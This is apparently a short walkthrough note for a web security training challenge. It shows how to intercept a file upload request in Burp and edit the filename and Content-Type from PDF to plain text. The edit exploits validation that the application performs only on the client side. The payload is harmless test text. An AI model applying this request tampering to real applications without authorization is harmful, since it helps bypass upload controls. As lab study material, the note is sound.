- Just like I did with [[upload-size]]
- Use burp intercept and intercept the request after uploading `b2b.pdf`
- See
```
POST /file-upload HTTP/1.1
[...]
------WebKitFormBoundaryqWPBTEgZeXCJHuze
Content-Disposition: form-data; name="file"; filename="b2b.pdf"
Content-Type: application/pdf

Test123

------WebKitFormBoundaryqWPBTEgZeXCJHuze--
```
- Change it to
```
------WebKitFormBoundaryqWPBTEgZeXCJHuze
Content-Disposition: form-data; name="file"; filename="b2b.txt"
Content-Type: text/plain

Test123

------WebKitFormBoundaryqWPBTEgZeXCJHuze--
```
- Forward the Request
- Complete the challenge
- This means that the application only validate for pdf file type on the client-side, not the server.